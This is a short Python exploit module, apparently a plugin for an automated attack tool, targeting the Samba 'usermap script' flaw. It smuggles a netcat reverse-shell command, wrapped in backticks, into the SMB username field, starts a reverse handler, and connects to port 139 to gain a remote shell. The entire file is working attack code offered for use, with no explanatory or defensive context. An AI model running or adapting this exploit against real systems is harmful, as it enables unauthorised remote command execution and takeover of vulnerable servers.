#!/usr/bin/python3

import smbclient

def exploit(args, port, reverse_handler):
    payload = "/=`%s`" % (reverse_handler.payload_NETCAT.strip('\n'))
    smb = smbclient.SambaClient(server=args.target, share="tmp", \
                                username=payload, password='password', domain='WORKGROUP')
    reverse_handler.run()
    try:
        print("    \033[1;32m*\033[00m Sending stage %s:%d" % (args.target, port))
        smb.listdir('/')
    except smbclient.SambaClientError: pass

def run(args, data, reverse_handler):
    #tcp port scan doesnt do service discovery
    #so exploit will just try on port 139 till then
    print("\033[1;34m[*]\033[00m Attempting exploit: samba_usermap")
    exploit(args, 139, reverse_handler)
